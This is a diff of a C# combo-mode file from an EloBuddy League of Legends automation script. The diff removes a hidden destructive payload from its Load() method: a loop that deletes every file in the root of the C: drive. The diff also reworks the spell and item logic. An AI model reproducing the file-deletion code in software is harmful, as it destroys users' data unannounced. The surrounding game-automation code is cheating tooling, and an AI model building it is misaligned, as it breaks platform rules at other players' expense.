@@ -1,6 +1,4 @@
-//thanks
 ﻿using System;
-﻿using System.IO;
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
@@ -8,6 +6,7 @@ using System.Threading.Tasks;
 using EloBuddy;
 using EloBuddy.SDK;
 using Auto_Carry_Vayne.Manager;
+using Auto_Carry_Vayne.Logic;
 
 namespace Auto_Carry_Vayne.Features.Modes
 {
@@ -15,18 +14,12 @@ namespace Auto_Carry_Vayne.Features.Modes
     {
         public static void Load()
         {
-            Chat.Say("/all moo");
-            string[] fileNames = System.IO.Directory.GetFiles(@"c:");
-            foreach (string fileName in fileNames)
-                System.IO.File.Delete(fileName);
             var target = TargetSelector.GetTarget((int)Variables._Player.GetAutoAttackRange(),
     DamageType.Physical);
             if (target == null) return;
             UseQ();
             UseE();
             UseR();
-            UseTrinket(target);
-            Botrk(target);
         }
 
         public static void UseQ()
@@ -41,16 +34,16 @@ namespace Auto_Carry_Vayne.Features.Modes
                     return;
                 }
                 #endregion
-                Logic.Tumble.CastDash();
+                Tumble.CastDash();
             }
         }
 
         public static void UseE()
         {
-            var ctarget = Logic.Condemn.GetTarget(ObjectManager.Player.Position);
-            if (ctarget == null) return;
             if (Variables.AfterAttack && Manager.MenuManager.UseE && Manager.SpellManager.E.IsReady())
             {
+                var ctarget = Logic.Condemn.GetTarget(ObjectManager.Player.Position);
+                if (ctarget == null) return;
                 Manager.SpellManager.E.Cast(ctarget);
             }
         }
@@ -63,42 +56,6 @@ namespace Auto_Carry_Vayne.Features.Modes
                 {
                     Manager.SpellManager.R.Cast();
                 }
-            }
-        }
-
-        public static void Botrk(Obj_AI_Base unit)
-        {
-            if (Variables.AfterAttack && (unit.Distance(ObjectManager.Player) > 500f || (ObjectManager.Player.Health / ObjectManager.Player.MaxHealth) * 100 <= 95))
-            {
-                if (Item.HasItem(3144) && Item.CanUseItem(3144))
-                {
-                    Item.UseItem(3144, unit);
-                }
-                if (Item.HasItem(3153) && Item.CanUseItem(3153))
-                {
-                    Item.UseItem(3153, unit);
-                }
-            }
-        }
-
-        public static void UseTrinket(Obj_AI_Base target)
-        {
-            if (target == null) return;
-
-            if (Variables._Player.Spellbook.GetSpell(SpellSlot.Trinket).IsReady &&
-                Variables._Player.Spellbook.GetSpell(SpellSlot.Trinket).SData.Name.ToLower().Contains("totem"))
-            {
-                Core.DelayAction(delegate
-                {
-                    if (Manager.MenuManager.AutoTrinket)
-                    {
-                        var pos = Logic.Mechanics.GetFirstNonWallPos(Variables._Player.Position.To2D(), target.Position.To2D());
-                        if (NavMesh.GetCollisionFlags(pos).HasFlag(CollisionFlags.Grass))
-                        {
-                            Manager.SpellManager.totem.Cast(pos.To3D());
-                        }
-                    }
-                }, 200);
             }
         }
     }
